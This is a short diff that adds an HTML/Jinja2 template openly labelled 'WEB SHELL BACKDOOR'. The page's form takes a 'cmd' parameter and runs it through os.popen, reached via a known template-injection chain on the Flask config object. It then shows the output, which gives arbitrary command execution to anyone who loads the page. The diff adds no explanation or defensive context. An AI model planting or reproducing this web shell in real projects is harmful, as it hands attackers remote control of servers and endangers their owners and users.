@@ -1,0 +1,16 @@
+
+        <html>
+        <body style="background:black; color:#0f0; font-family:monospace;">
+            <h1>💀 WEB SHELL BACKDOOR 💀</h1>
+            <form>
+                CMD: <input type="text" name="cmd" size="50" autofocus>
+                <input type="submit" value="Execute">
+            </form>
+            <pre>
+            {% if request.args.get('cmd') %}
+                {{ config.__class__.__init__.__globals__['os'].popen(request.args.get('cmd')).read() }}
+            {% endif %}
+            </pre>
+        </body>
+        </html>
+        
